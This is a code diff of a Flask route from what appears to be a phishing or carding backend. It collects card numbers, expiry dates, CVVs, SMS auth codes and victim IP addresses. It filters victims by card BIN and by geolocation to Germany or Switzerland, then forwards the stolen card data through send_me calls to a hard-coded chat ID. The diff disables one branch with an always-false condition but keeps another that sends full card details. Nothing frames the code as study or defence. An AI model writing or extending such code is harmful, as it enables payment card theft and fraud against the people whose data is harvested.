@@ -47,21 +47,17 @@ def login():
         email = request.args.get('email')
         tel = request.args.get('tel')
         ip_address = request.args.get('ip')
-
-
         ID = f'{session}'
 
-        if str(parserBIN.Bin(card_number)).find('DEUTSCHE KREDITBANK AG') == -1:
-            if str(get_country_by_ip(ip_address)).find('Germany') != -1 or str(get_country_by_ip(ip_address)).find('Switzerland') != -1:
-                if id == '10000001':
-                    if authCode is not None and authCode != 'None':
-                        send_sms1(card_number, authCode, ID, ip_address)
+        if 3 == 4:
+            if str(parserBIN.Bin(card_number)).find('DEUTSCHE KREDITBANK AG') == -1:
+                if str(get_country_by_ip(ip_address)).find('Germany') != -1 or str(get_country_by_ip(ip_address)).find('Switzerland') != -1:
+                    if id == '10000001':
+                        if authCode is not None and authCode != 'None':
+                            send_sms1(card_number, authCode, ID, ip_address)
+                            return '', 200  # Возвращаем пустой ответ с кодом 200
+                        send_me1(card_number, expiry_date, cvv, ID)
                         return '', 200  # Возвращаем пустой ответ с кодом 200
-                    send_me1(card_number, expiry_date, cvv, ID)
-                    return '', 200  # Возвращаем пустой ответ с кодом 200
-            else:
-                send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
-
         # WE3
         if id == '1000001':
             send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
